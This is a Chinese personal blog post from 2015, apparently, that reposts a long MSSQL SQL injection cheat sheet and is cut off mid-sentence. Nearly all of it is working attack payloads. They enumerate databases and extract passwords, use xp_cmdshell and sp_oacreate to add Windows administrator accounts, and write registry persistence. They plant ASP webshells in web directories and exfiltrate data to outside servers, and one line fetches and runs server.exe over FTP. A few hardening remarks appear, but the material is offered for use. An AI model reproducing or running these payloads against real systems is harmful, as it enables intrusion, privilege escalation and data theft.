@@ -1,0 +1,647 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+    
+
+    <title>mssql 注入 | 个人博客网站--记录生活所得</title>
+    <meta name="author" content="ζั͡ޓ̯̯̯͡͡طىއއއ๓冰">
+    
+    <meta name="description" content="注入查阅
+源文：http://www.csdn123.com/html/itweb/20130818/66552_66558_66559.htm
+1、返回的是连接的数据库名and db_name()&amp;gt;02、作用是获取连接用户名and user&amp;gt;03、将数据库备份到Web目录下面;back">
+    
+    
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+    <meta property="og:title" content="mssql 注入"/>
+    <meta property="og:site_name" content="ζั͡ޓ̯̯̯͡͡طىއއއ๓冰"/>
+
+    
+    <meta property="og:image" content="undefined"/>
+    
+
+    <link rel="icon" type="image/png" href="/favicon.png">
+    <link rel="alternate" href="/atom.xml" title="ζั͡ޓ̯̯̯͡͡طىއއއ๓冰" type="application/atom+xml">
+    <link rel="stylesheet" href="/css/lib/materialize.min.css">
+    <link rel="stylesheet" href="/css/lib/font-awesome.min.css">
+    <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+
+    
+        <link rel="stylesheet" href="/css/lib/prettify-tomorrow-night-eighties.css" type="text/css">
+    
+    <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+</head>
+
+
+<body>
+    <img src="/weixin_favicon.png" style="position: absolute; left: -9999px; opacity: 0; filter: alpha(opacity=0);">
+
+    <nav class="indigo">
+    <div class="nav-wrapper">
+        <a href="#" data-activates="main-menu" class="button-collapse">
+            <i class="fa fa-navicon"></i>
+        </a>
+        <div class="">
+            <a href="/" class="brand-logo hide-on-med-and-down">ζั͡ޓ̯̯̯͡͡طىއއއ๓冰</a>
+            <ul class="right hide-on-med-and-down">
+                
+                    <li>
+                        <a class="menu-home " href="/" >
+                            <i class="fa fa-home "></i>
+                            
+                            首页
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-archive " href="/archives" >
+                            <i class="fa fa-archive "></i>
+                            
+                            归档
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-category category-menu" href="javascript:;" data-activates="category-menu" >
+                            <i class="fa fa-bookmark "></i>
+                            
+                            分类
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-about " href="/about" >
+                            <i class="fa fa-user "></i>
+                            
+                            关于
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-search modal-trigger " href="#search" >
+                            <i class="fa fa-search "></i>
+                            
+                            搜索
+                        </a>
+                    </li>
+                
+            </ul>
+            <div>
+    <ul class="side-nav indigo darken-1" id="main-menu">
+        
+        <li class="side-user">
+            <div class="row">
+                <div class="col s4 no-padding">
+                    <img class="avatar-image circle responsive-img" src="http://ww2.sinaimg.cn/small/74990035jw1f1rjkd681bj20rs0rsdhg.jpg" alt="User Avatar">
+                </div>
+                <div class="info col s8 valign-wrapper no-padding">
+                    <div class="valign">
+                        <p class="name">ζั͡ޓ̯̯̯͡͡طىއއއ๓冰</p>
+                        <p class="desc">Web前端/技术宅</p>
+                    </div>
+                </div>
+            </div>
+        </li>
+        
+
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-home " href="/" >
+                    <i class="fa fa-home "></i>
+                    
+                    首页
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-archive " href="/archives" >
+                    <i class="fa fa-archive "></i>
+                    
+                    归档
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-category category-menu" href="javascript:;" data-activates="category-menu" >
+                    <i class="fa fa-bookmark "></i>
+                    
+                    分类
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-about " href="/about" >
+                    <i class="fa fa-user "></i>
+                    
+                    关于
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-search modal-trigger " href="#search" >
+                    <i class="fa fa-search "></i>
+                    
+                    搜索
+                </a>
+            </li>
+        
+    </ul>
+
+    <ul class="side-nav indigo darken-1" id="category-menu">
+    
+
+            
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/freebuf/">
+                    freebuf <span class="right">5 篇</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/便宜vps/">
+                    便宜vps <span class="right">6 篇</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/随笔记录/">
+                    随笔记录 <span class="right">12 篇</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/centos/">
+                    centos <span class="right">7 篇</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/记录/">
+                    记录 <span class="right">26 篇</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/ubuntu/">
+                    ubuntu <span class="right">2 篇</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/debian/">
+                    debian <span class="right">1 篇</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/数据库应用/">
+                    数据库应用 <span class="right">3 篇</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/metasploit/">
+                    metasploit <span class="right">5 篇</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/apache/">
+                    apache <span class="right">1 篇</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/kali-linux/">
+                    kali-linux <span class="right">2 篇</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/隧道技术/">
+                    隧道技术 <span class="right">1 篇</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/linux-mint/">
+                    linux-mint <span class="right">4 篇</span></a>
+                </a>
+            </li>
+
+        
+
+    </ul>
+</div>
+
+        </div>
+    </div>
+</nav>
+
+<div id="search" class="modal search-modal">
+    <div class="row">
+        <div class="input-field col s12">
+              <input id="search-input" type="text">
+              <label for="search-input">搜索</label>
+        </div>
+
+    </div>
+    <div id="search-result" class="search-result col s12">
+
+    </div>
+</div>
+
+
+    <main>
+        <div class="container main-container">
+    <nav class="page-nav hide-on-small-only">
+    <div class="nav-wrapper indigo">
+        <span class="breadcrumb">当前位置（分类目录）</span>
+        
+            
+    
+    
+    <a class="breadcrumb" href="/categories/数据库应用/">数据库应用</a>
+
+
+        
+
+        
+    </div>
+</nav>
+
+<article>
+    <div class="card">
+        <div class="card-content">
+            
+
+            <div class="article-title">
+                
+    
+        <h1>mssql 注入</h1>
+    
+
+
+            </div>
+            <time class="indigo-link-context" datetime="2015-04-25T07:08:34.000Z"><a href="/2015-04-25-mssql-e6-b3-a8-e5-85-a5.html">2015-04-25</a></time>
+
+            
+
+            <div class="toc indigo-link-context hide-on-med-and-down">
+    
+</div>
+
+
+            <div class="entry indigo-link-context">
+                <p><strong>注入查阅</strong></p>
+<p>源文：<a href="http://www.csdn123.com/html/itweb/20130818/66552_66558_66559.htm" target="_blank" rel="external">http://www.csdn123.com/html/itweb/20130818/66552_66558_66559.htm</a></p>
+<div class="cnblogs_code"><img src="http://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif" alt=""><br><div id="cnblogs_code_open_c36fda50-cd5d-4535-bf72-438ce7d55e05" class="cnblogs_code_hide"><br><pre>1、返回的是连接的数据库名<br>and db_name()&gt;0<br>2、作用是获取连接用户名<br>and user&gt;0<br>3、将数据库备份到Web目录下面<br>;backup database 数据库名 to disk=’c:\inetpub\wwwroot\1.db’;–<br>4、显示SQL系统版本<br>and 1=(select @@VERSION) 或and 1=convert(int,@@version)–<br>5、判断xp_cmdshell扩展存储过程是否存在<br>and 1=(SELECT count(<em>) FROM master.dbo.sysobjects WHERE xtype = ‘X’ AND name =’xp_cmdshell’)<br>6、恢复xp_cmdshell扩展存储的命令<br>;exec master.dbo.sp_addextendedproc ‘xp_cmdshell’,’e:\inetput\web\xplog70.dll’;–<br>7、向启动组中写入命令行和执行程序<br>;EXEC master.dbo.xp_regwrite ‘HKEY_LOCAL_MACHINE’,’SOFTWARE\Microsoft\Windows\CurrentVersion\<br>Run’,’help1’,’REG_SZ’,’cmd.exe /c net user test ptlove /add’<br>8、查看当前的数据库名称<br>and 0 &lt;&gt; db_name(n) n改成0,1,2,3……就可以跨库了 或and 1=convert(int,db_name())–<br>9、不需xp_cmdshell支持在有注入漏洞的SQL服务器上运行CMD命令（同第76）<br>10、则把得到的数据内容全部备份到WEB目录下<br>;backup database 数据库名 to disk=’c:\inetpub\wwwroot\save.db’<br>11、通过复制CMD创建UNICODE漏洞<br>;exec master.dbo.xp_cmdshell “copy c:\winnt\system32\cmd.exe   c:\inetpub\scripts\cmd.exe”<br>12、遍历系统的目录结构，分析结果并发现WEB虚拟目录<br>先创建一个临时表：temp ;create table temp(id nvarchar(255),num1 nvarchar(255),num2 nvarchar(255),num3 nvarchar(255));–<br>(1)利用xp_availablemedia来获得当前所有驱动器,并存入temp表中    ;insert temp exec master.dbo.xp_availablemedia;–<br>通过查询temp的内容来获得驱动器列表及相关信息<br>(2)利用xp_subdirs获得子目录列表,并存入temp表中                    ;insert into temp(id) exec master.dbo.xp_subdirs ‘c:\’;–<br>(3)还可以利用xp_dirtree获得所有子目录的目录树结构,并寸入temp表中   ;insert into temp(id,num1) exec master.dbo.xp_dirtree ‘c:\’;– （实验成功）<br>13、查看某个文件的内容，可以通过执行xp_cmdsell<br>;insert into temp(id) exec master.dbo.xp_cmdshell ‘type c:\web\index.asp’;–<br>14、将一个文本文件插入到一个临时表中<br>;bulk insert temp(id) from ‘c:\inetpub\wwwroot\index.asp’<br>15、每完成一项浏览后，应删除TEMP中的所有内容，删除方法是：<br>;delete from temp;–<br>16、浏览TEMP表的方法是：<br>and (select top 1 id from TestDB.dbo.temp)&gt;0 假设TestDB是当前连接的数据库名<br>17、猜解所有数据库名称<br>and (select count(</em>) from master.dbo.sysdatabases where name&gt;1 and dbid=6) &lt;&gt;0   dbid=6,7,8分别得到其它库名<br>18、猜解数据库中用户名表的名称<br>and (select count(<em>) from TestDB.dbo.表名)&gt;0 若表名存在，则abc.asp工作正常，否则异常。如此循环，直到猜到系统帐号表的名称。<br>19、判断是否是sysadmin权限<br>and 1=(SELECT IS_SRVROLEMEMBER(‘sysadmin’))<br>20、判断是否是SA用户<br>‘sa’=(SELECT System_user)<br>21、查看数据库角色<br>;use model–<br>22、查看库名<br>and 0&lt;&gt;(select count(</em>) from master.dbo.sysdatabases where name&gt;1 and dbid=6)–<br>23、获得第一个用户建立表的名称<br>and (select top 1 name from TestDB.dbo.sysobjects where xtype=’U’ and status&gt;0 )&gt;0   假设要获得数据库是TestDB.dbo<br>24、获得第二个用户建立的表的名称<br>and (select top 1 name from TestDB.dbo.sysobjects where xtype=’U’ and status&gt;0 and name not in(‘xyz’))&gt;0<br>25、获得第三个用户建立的表的名称<br>and (select top 1 name from TestDB.dbo.sysobjects where xtype=’U’ and status&gt;0 and name not in(‘xyz’,’’))&gt;0   ‘’中为第二个用户名<br>26、获得第四个用户建立的表的名称<br>and (select top 1 name from TestDB.dbo.sysobjects where xtype=’U’ and status&gt;0 and name not in(‘xyz’,’’,’’))&gt;0   ‘’,’’中为第二,三个用户名<br>27、获得表中记录的条数<br>and (select count(<em>) from 表名）&lt;5 记录条数小于5   或   &lt;10 记录条数小于10   ……等等<br>28、测试权限结构（mssql）<br>and 1=(SELECT IS_SRVROLEMEMBER(‘sysadmin’));–<br>and 1=(SELECT IS_SRVROLEMEMBER(‘serveradmin’));–<br>and 1=(SELECT IS_SRVROLEMEMBER(‘setupadmin’));–<br>and 1=(SELECT IS_SRVROLEMEMBER(‘securityadmin’));–<br>and 1=(SELECT IS_SRVROLEMEMBER(‘diskadmin’));–<br>and 1=(SELECT IS_SRVROLEMEMBER(‘bulkadmin’));–<br>and 1=(SELECT IS_MEMBER(‘db_owner’));–<br>29、 添加mssql和系统的帐户<br>;exec master.dbo.sp_addlogin username;–<br>;exec master.dbo.sp_password null,username,password;–<br>;exec master.dbo.sp_addsrvrolemember sysadmin username;–<br>;exec master.dbo.xp_cmdshell ‘net user username password /workstations:</em> /times:all /passwordchg:yes /passwordreq:yes /active:yes /add’;–<br>;exec master.dbo.xp_cmdshell ‘net user username password /add’;–<br>;exec master.dbo.xp_cmdshell ‘net localgroup administrators username /add’;–<br>30、 简洁的webshell<br>use model<br>create table cmd(str image);<br>insert into cmd(str) values (‘&lt;%=server.createobject(“wscript.shell”).exec(“cmd.exe /c “&amp;request(“c”)).stdout.readall%&gt;’);<br>backup database model to disk=’g:\wwwtest\l.asp’;<br><br>请求的时候，像这样子用：<br><a href="http://ip/l.asp?c=dir" target="_blank" rel="external">http://ip/l.asp?c=dir</a><br>31、猜解字段名称<br>猜解法：and (select count(字段名) from 表名)&gt;0   若“字段名”存在，则返回正常<br>读取法：and (select top 1 col_name(object_id(‘表名’),1) from sysobjects)&gt;0   把col_name(object_id(‘表名’),1)中的1依次换成2,3,4,5，6…就可得到所有的字段名称。<br>32、 猜解用户名与密码<br>ASCII码逐字解码法:基本的思路是先猜出字段的长度，然后依次猜出每一位的值<br>and (select top 1 len(username) from admin)=X(X=1,2，3,4，5，… n，假设：username为用户名字段的名称，admin为表的名称   若x为某一值i且abc.asp运行正常时，则i就是第一个用户名的长度。<br>and (select top 1 ascii(substring(username,m,1)) from admin)=n   (m的值在上一步得到的用户名长度之间，当m=1，2,3，…时猜测分别猜测第1,2,3,…位的值；n的值是1~9、a~z、A~Z的ASCII值，也就是1~128之间的任意值；admin为系统用户帐号表的名称)，<br>33、建立数据表<br>;create table 表名 (列名1 数据类型,列名2 数据类型);–<br>34、向表格中插入数据<br>;insert into 表名 (列名1,列名2，……） values (‘值1’,’值2’……);–<br>35、更新记录<br>update 表名 set 列名1=’值’…… where ……<br>36、删除记录<br>delete from 表名 where ……<br>37、删除数据库表格<br>drop table 表名<br>38、将文本文件导入表<br>使用’bulk insert’语法可以将一个文本文件插入到一个临时表中。简单地创建这个表：<br>create table foo( line varchar(8000))<br>然后执行bulk insert操作把文件中的数据插入到表中，如：<br>bulk insert foo from ‘c:\inetpub\wwwroot\process_login.asp’<br>39、备份当前数据库的命令：<br>declare @a sysname;set @a=db_name();backup database @a to disk=’你的IP你的共享目录bak.dat’ ,name=’test’;–<br>40、使用sp_makewebtask处理过程的相关请求写入URL<br>; EXEC master..sp_makewebtask “\10.10.1.3\share\output.html”, “SELECT <em> FROM INFORMATION_SCHEMA.TABLES”<br>41、将获得SQLSERVER进程的当前工作目录中的目录列表<br>Exec master..xp_cmdshell ‘dir’<br>42、将提供服务器上所有用户的列表<br>Exec master..xp_cmdshell ‘net user’<br>43、读注册表存储过程<br>exec xp_regread HKEY_LOCAL_MACHINE,’SYSTEM\CurrentControlSet\Services\lanmanserver\parameters’, ‘nullsessionshares’<br>44、xp_servicecontrol过程允许用户启动，停止，暂停和继续服务<br>exec master..xp_servicecontrol ‘start’,’schedule’<br>exec master..xp_servicecontrol ‘start’,’server’<br>45、显示机器上有用的驱动器<br>Xp_availablemedia<br>46、允许获得一个目录树<br>Xp_dirtree<br>47、提供进程的进程ID，终止此进程<br>Xp_terminate_process<br>48、恢复xp_cmdshell<br>Exec master.dbo.addextendedproc ‘xp_cmdshell’,’xplog70.dll’<br>49、堵上cmdshell的SQL语句<br>sp_dropextendedproc “xp_cmdshell”<br>50、不需要XP_CMDSHLL直接添加系统帐号,对XPLOG70.DLL被删很有效<br>declare @shell int exec sp_oacreate ‘wscript.shell’,@shell output exec sp_oamethod @shell,’run’,null,’c:\winnt\system32\cmd.exe /c net user gchn aaa /add’–<br>51、在数据库内添加一个hax用户<br>;exec sp_addlogin hax;–<br>52、给hax设置密码<br>;exec master.dbo.sp_password null,username,password;–<br>53、将hax添加到sysadmin组<br>;exec master.dbo.sp_addsrvrolemember sysadmin hax;–<br>54、(1)遍历目录<br>;create table dirs(paths varchar(100), id int)<br>;insert dirs exec master.dbo.xp_dirtree ‘c:\’<br>;and (select top 1 paths from dirs)&gt;0<br>;and (select top 1 paths from dirs where paths not in(‘上步得到的paths’))&gt;)<br>55、(2)遍历目录<br>;create table temp(id nvarchar(255),num1 nvarchar(255),num2 nvarchar(255),num3 nvarchar(255));–<br>;insert temp exec master.dbo.xp_availablemedia;– 获得当前所有驱动器<br>;insert into temp(id) exec master.dbo.xp_subdirs ‘c:\’;– 获得子目录列表<br>;insert into temp(id,num1) exec master.dbo.xp_dirtree ‘c:\’;– 获得所有子目录的目录树结构<br>;insert into temp(id) exec master.dbo.xp_cmdshell ‘type c:\web\index.asp’;– 查看文件的内容<br>56、mssql中的存储过程<br>xp_regenumvalues 注册表根键, 子键<br>;exec xp_regenumvalues ‘HKEY_LOCAL_MACHINE’,’SOFTWARE\Microsoft\Windows\CurrentVersion\Run’ 以多个记录集方式返回所有键值<br>xp_regread 根键,子键,键值名<br>;exec xp_regread ‘HKEY_LOCAL_MACHINE’,’SOFTWARE\Microsoft\Windows\CurrentVersion’,’CommonFilesDir’ 返回制定键的值<br>xp_regwrite 根键,子键, 值名, 值类型, 值<br>值类型有2种REG_SZ 表示字符型,REG_DWORD 表示整型<br>;exec xp_regwrite ‘HKEY_LOCAL_MACHINE’,’SOFTWARE\Microsoft\Windows\CurrentVersion’,’TestValueName’,’reg_sz’,’hello’ 写入注册表<br>xp_regdeletevalue 根键,子键,值名<br>exec xp_regdeletevalue ‘HKEY_LOCAL_MACHINE’,’SOFTWARE\Microsoft\Windows\CurrentVersion’,’TestValueName’ 删除某个值<br>xp_regdeletekey ‘HKEY_LOCAL_MACHINE’,’SOFTWARE\Microsoft\Windows\CurrentVersion\Tes</em></pre><br></div><br><span class="cnblogs_code_collapse">View Code</span></div><br><div class="cnblogs_code"><img src="http://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif" alt=""><br><div id="cnblogs_code_open_e27c848f-25c3-4002-a5df-087ca726e167" class="cnblogs_code_hide"><br><pre>啊D注入的命令：<br><br>//看看是什么权限的<br>and 1=(Select IS_MEMBER(‘db_owner’))<br>And char(124)%2BCast(IS_MEMBER(‘db_owner’) as varchar(1))%2Bchar(124)=1 ;–<br><br>//检测是否有读取某数据库的权限<br>and 1= (Select HAS_DBACCESS(‘master’))<br>And char(124)%2BCast(HAS_DBACCESS(‘master’) as varchar(1))%2Bchar(124)=1 –<br><br>数字类型<br>and char(124)%2Buser%2Bchar(124)=0<br><br>字符类型<br>‘ and char(124)%2Buser%2Bchar(124)=0 and ‘’=’<br><br>搜索类型<br>‘ and char(124)%2Buser%2Bchar(124)=0 and ‘%’=’<br><br>爆用户名<br>and user&gt;0<br>‘ and user&gt;0 and ‘’=’<br><br>检测是否为SA权限<br>and 1=(select IS_SRVROLEMEMBER(‘sysadmin’));–<br>And char(124)%2BCast(IS_SRVROLEMEMBER(0x730079007300610064006D0069006E00) as varchar(1))%2Bchar(124)=1 –<br><br>检测是不是MSSQL数据库<br>and exists (select  from sysobjects);–<br><br>检测是否支持多行<br>;declare @d int;–<br><br>恢复 xp_cmdshell<br>;exec master..dbo.sp_addextendedproc ‘xp_cmdshell’,’xplog70.dll’;–<br><br>select <em> from openrowset(‘sqloledb’,’server=192.168.1.200,1433;uid=test;pwd=pafpaf’,’select @@version’)<br><br>//———————–<br>//      执行命令<br>//———————–<br>首先开启沙盘模式：<br>exec master..xp_regwrite ‘HKEY_LOCAL_MACHINE’,’SOFTWARE\Microsoft\Jet\4.0\Engines’,’SandBoxMode’,’REG_DWORD’,1<br><br>然后利用jet.oledb执行系统命令<br>select </em> from openrowset(‘microsoft.jet.oledb.4.0’,’;database=c:\winnt\system32\ias\ias.mdb’,’select shell(“cmd.exe /c net user admin admin1234 /add”)’)<br><br>执行命令<br>;DECLARE @shell INT EXEC SP_OAcreate ‘wscript.shell’,@shell OUTPUT EXEC SP_OAMETHOD @shell,’run’,null, ‘C:\WINNT\system32\cmd.exe /c net user paf pafpaf /add’;–<br><br>EXEC [master].[dbo].[xp_cmdshell] ‘cmd /c md c:\1111’<br><br>判断xp_cmdshell扩展存储过程是否存在：<br>[url=<a href="http://192.168.1.5/display.asp?keyno=188]链接标记http://192.168.1.5/display.asp?keyno=188[/url" target="_blank" rel="external">http://192.168.1.5/display.asp?keyno=188]链接标记http://192.168.1.5/display.asp?keyno=188[/url</a>] and 1=(Select count(<em>) FROM master.dbo.sysobjects Where xtype = ‘X’ AND name = ‘xp_cmdshell’)<br><br>写注册表<br>exec master..xp_regwrite ‘HKEY_LOCAL_MACHINE’,’SOFTWARE\Microsoft\Jet\4.0\Engines’,’SandBoxMode’,’REG_DWORD’,1<br><br>REG_SZ<br><br>读注册表<br>exec master..xp_regread ‘HKEY_LOCAL_MACHINE’,’SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon’,’Userinit’<br><br>读取目录内容<br>exec master..xp_dirtree ‘c:\winnt\system32\’,1,1<br><br>数据库备份<br>backup database pubs to disk = ‘c:\123.bak’<br><br>//爆出长度<br>And (Select char(124)%2BCast(Count(1) as varchar(8000))%2Bchar(124) From D99_Tmp)=0 ;–<br><br>更改sa口令方法：用sql综合利用工具连接后，执行命令：<br>exec sp_password NULL,’新密码’,’sa’<br><br>添加和删除一个SA权限的用户test：<br>exec master.dbo.sp_addlogin test,ptlove<br>exec master.dbo.sp_addsrvrolemember test,sysadmin<br><br>删除扩展存储过过程xp_cmdshell的语句:<br>exec sp_dropextendedproc ‘xp_cmdshell’<br><br>添加扩展存储过过程<br>EXEC [master]..sp_addextendedproc ‘xp_proxiedadata’, ‘c:\winnt\system32\sqllog.dll’<br>GRANT exec On xp_proxiedadata TO public<br><br>停掉或激活某个服务。<br><br>exec master..xp_servicecontrol ‘stop’,’schedule’<br>exec master..xp_servicecontrol ‘start’,’schedule’<br><br>dbo.xp_subdirs<br><br>只列某个目录下的子目录。<br>xp_getfiledetails ‘C:\Inetpub\wwwroot\SQLInject\login.asp’<br><br>dbo.xp_makecab<br><br>将目标多个档案压缩到某个目标档案之内。<br>所有要压缩的档案都可以接在参数列的最后方，以逗号隔开。<br><br>dbo.xp_makecab<br>‘c:\test.cab’,’mszip’,1,<br>‘C:\Inetpub\wwwroot\SQLInject\login.asp’,<br>‘C:\Inetpub\wwwroot\SQLInject\securelogin.asp’<br><br>xp_terminate_process<br><br>停掉某个执行中的程序，但赋予的参数是 Process ID。<br>利用”工作管理员”，透过选单「检视」-「选择字段」勾选 pid，就可以看到每个执行程序的 Process ID<br><br>xp_terminate_process 2484<br><br>xp_unpackcab<br><br>解开压缩档。<br><br>xp_unpackcab ‘c:\test.cab’,’c:\temp’,1<br><br>某机，安装了radmin，密码被修改了，regedit.exe不知道被删除了还是被改名了，net.exe不存在，没有办法使用regedit /e 导入注册文件，但是mssql是sa权限，使用如下命令 EXEC master.dbo.xp_regwrite ‘HKEY_LOCAL_MACHINE’,’SYSTEM\RAdmin\v2.0\Server\Parameters’,’Parameter’,’REG_BINARY’,0x02ba5e187e2589be6f80da0046aa7e3c 即可修改密码为12345678。如果要修改端口值 EXEC master.dbo.xp_regwrite ‘HKEY_LOCAL_MACHINE’,’SYSTEM\RAdmin\v2.0\Server\Parameters’,’port’,’REG_BINARY’,0xd20400 则端口值改为1234<br><br>create database lcx;<br>Create TABLE ku(name nvarchar(256) null);<br>Create TABLE biao(id int NULL,name nvarchar(256) null);<br><br>//得到数据库名<br>insert into opendatasource(‘sqloledb’,’server=211.39.145.163,1443;uid=test;pwd=pafpaf;database=lcx’).lcx.dbo.ku select name from master.dbo.sysdatabases<br><br>//在Master中创建表，看看权限怎样<br>Create TABLE master..D_TEST(id nvarchar(4000) NULL,Data nvarchar(4000) NULL);–<br><br>用 sp_makewebtask直接在web目录里写入一句话马：<br>[url=<a href="http://127.0.0.1/dblogin123.asp?username=123]链接标记http://127.0.0.1/dblogin123.asp?username=123&#39;[/url];exec%20sp_makewebtask%20&#39;d:\www\tt\88.asp&#39;,&#39;%20select%20&#39;&#39;&lt;%25execute(request(&quot;a&quot;))%25&gt;&#39;&#39;%20&#39;;--" target="_blank" rel="external">http://127.0.0.1/dblogin123.asp?username=123]链接标记http://127.0.0.1/dblogin123.asp?username=123&#39;[/url];exec%20sp_makewebtask%20&#39;d:\www\tt\88.asp&#39;,&#39;%20select%20&#39;&#39;&lt;%25execute(request(&quot;a&quot;))%25&gt;&#39;&#39;%20&#39;;--</a><br><br>//更新表内容<br>Update films SET kind = ‘Dramatic’ Where id = 123<br><br>//删除内容<br>delete from table_name where Stockid = 3</em></pre><br></div><br><span class="cnblogs_code_collapse">View Code</span></div><br>&nbsp;<br><br>&nbsp;<br><br><strong>MSSQL下执行系统命令</strong><br><div class="cnblogs_code"><img src="http://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif" alt=""><br><div id="cnblogs_code_open_8e0abe95-1edf-4fd8-9f8a-c2f3f7e3ede7" class="cnblogs_code_hide"><br><pre>假设我们已经连接一台1433的服务器,<br><br>那我们要如何来执行系统命令呢，这里我就给大家讲解下啦.<br><br>1).XP_CMDSHELL ‘cmd.exe /c net user aaa bbb /add’<br>人人都知道的办法,最大的好处是有回显,但是最怕<br><br>if exists (select  from dbo.sysobjects where id = object_id(N’[dbo].[xp_cmdshell]’) and OBJECTPROPERTY(id, N’IsExtendedProc’) = 1)<br>exec sp_dropextendedproc N’[dbo].[xp_cmdshell]’<br>GO<br><br>通过上面的T-SQL语句就可以把这个扩展储存删了<br><br>我们一般可以用<br>2k:<br>EXEC sp_addextendedproc xp_cmdshell ,@dllname =’xplog70.dll’<br>SQL97:<br>EXEC sp_addextendedproc xp_cmdshell ,@dllname =’xpsql70.dll’<br><br>就还原了.<br><br>但是有的人知道sp_addextendedproc也只不过是一个储存过程一样可以删除的<br><br>Drop PROCEDURE sp_addextendedproc<br>if exists (select <em> from<br>dbo.sysobjects where id = object_id(N’[dbo].[xp_cmdshell]’) and<br>OBJECTPROPERTY(id, N’IsExtendedProc’) = 1)<br>exec sp_dropextendedproc N’[dbo].[xp_cmdshell]’<br>GO<br><br>还原:<br>create procedure sp_addextendedproc — 1996/08/30 20:13<br>@functname nvarchar(517),/</em> (owner.)name of function to call <em>/<br>@dllname varchar(255)/</em> name of DLL containing function <em>/<br>as<br>set implicit_transactions off<br>if @@trancount &gt; 0<br>begin<br>raiserror(15002,-1,-1,’sp_addextendedproc’)<br>return (1)<br>end<br>/</em><br><strong> Create the extended procedure mapping.<br><em>/<br>dbcc addextendedproc( @functname, @dllname)<br>return (0) – sp_addextendedproc<br>GO<br><br>唉呀呀写了这么多其实有个最简单的保护办法:<br>先NET stop mssqlserver,然后把xplog70.dll(SQL97下用xpsql70.dll)删了<br>再把服务打开就可以了<br><br>2)<br>看了上面的你就明白了xp_cmdshell最终是可以被删除的，没别的办法了吗?<br>有写注册表三:<br>xp_regwrite ‘HKEY_LOCAL_MACHINE’,’SOFTWARE\Microsoft\Windows\currentversion\run’, ‘czy82’,’REG_SZ’, net user czy bb /add<br><br>其实注册表还有好几个地方可以写的比如说注册表中的WEB浏览设置<br>用写注册表的办法不好的地方是不但没有回显而且不能马上运行，实不实用我也不知道了<br><br>3)<br>declare @s int<br>exec sp_oacreate “wscript.shell”,@s out<br>–exec sp_oamethod @s,”run”,NULL,”cmd.exe /c echo open asp.7i24.com&gt;c:\a.txt”<br>–exec sp_oamethod @s,”run”,NULL,”cmd.exe /c echo 123321&gt;&gt;c:\a.txt”<br>–exec sp_oamethod @s,”run”,NULL,”cmd.exe /c echo 123321&gt;&gt;c:\a.txt”<br>–exec sp_oamethod @s,”run”,NULL,”cmd.exe /c echo get server.exe&gt;&gt;c:\a.txt”<br>–exec sp_oamethod @s,”run”,NULL,”cmd.exe /c echo close&gt;&gt;c:\a.txt”<br>–exec sp_oamethod @s,”run”,NULL,”cmd.exe /c ftp -s:c:\a.txt”<br>exec sp_oamethod @s,”run”,NULL,”cmd.exe /c server”<br><br>对了正如你看到的我们还可以使用sp_oacreate和sp_oamethod，在它们的作用下我们可以<br>调用系统的控件比如说fso,wsh,shell什么的,但是有个问题是并不能象xp_cmdshell那样<br>马上看到结果，真的不能吗看下面的:<br><br>declare @s int,@o int ,@f int,@str nvarchar(4000)<br>/</em>exec sp_oacreate “wscript.shell”,@s out<br>exec sp_oamethod @s,”run”,NULL,”cmd.exe /c net user&gt;c:\temp.txt”*/<br>exec sp_oacreate “scripting.filesystemobject”, @o out<br>exec sp_oamethod @o, “opentextfile”, @f out,”c:\temp.txt”, 1<br>exec sp_oamethod @f, “readall”,@str out<br>print @str<br><br>先执行注解内的然后执行外面的其实原理很简单就是利用&gt;把结果写到一个文件中然后用<br>fso来读出来!很实用的<br><br>——————————————<br>写到这儿该作个总结了上面三个办法可能大家都知道吧<br>下面的可能知道的人就少了<br>——————————————<br><br>4)<br>use msdb; –这儿不要是master哟<br>exec sp_add_job @job_name=’czy82’;<br>exec sp_add_jobstep @job_name=’czy82’,@step_name = ‘Exec my 